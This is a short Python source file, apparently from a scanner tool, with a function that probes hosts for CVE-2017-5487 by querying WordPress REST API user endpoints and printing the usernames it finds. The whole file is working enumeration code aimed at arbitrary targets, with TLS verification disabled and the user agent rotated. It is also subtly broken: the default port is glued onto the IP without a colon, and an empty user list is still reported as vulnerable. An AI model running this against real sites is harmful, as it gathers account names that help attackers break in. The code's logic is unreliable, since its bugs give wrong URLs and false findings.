import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2017_5487(ip, ports=None, timeout=5):
    headers = {"User-Agent": user_agents()}
    wordpress_api_endpoints = ["/?rest_route=/wp/v2/users/", "/wp-json/wp/v2/users/"]
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]
    for protocol in protocols:
        for port in ports:
            for path in wordpress_api_endpoints:
                url = f"{protocol}://{ip}{port}{path}"
                try:
                    response = requests.get(url, verify=False, timeout=timeout, headers=headers)
                    response.raise_for_status()
                    user_data = response.json()
                    if isinstance(user_data, list):
                        for user in user_data:
                            if 'slug' in user:
                                print_colour(f"The target is vulnerable to CVE-2017-5487 : {url} [{user['slug']}]")
                        return True
                except requests.RequestException:
                    continue
    return False